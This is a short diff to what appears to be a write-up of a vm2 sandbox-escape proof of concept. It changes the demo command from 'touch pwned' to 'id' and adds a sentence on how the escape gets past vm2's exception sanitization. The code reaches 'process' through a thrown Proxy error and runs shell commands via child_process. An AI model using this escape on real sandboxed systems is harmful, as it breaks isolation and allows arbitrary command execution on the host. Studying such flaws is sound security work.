@@ -48,6 +48,8 @@ const proxiedErr = new Proxy(err, handler);
 try {
     throw proxiedErr;
 } catch ({constructor: c}) {
-    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+    c.constructor('return process')().mainModule.require('child_process').execSync('id');
 }
 ```
+
+Why are restrictions avoided with this code? Because VM2 uses the transformer() module to preprocess and modify its source code, for example, they modify the way exceptions are raised to raise sanitized exceptions with handleException().
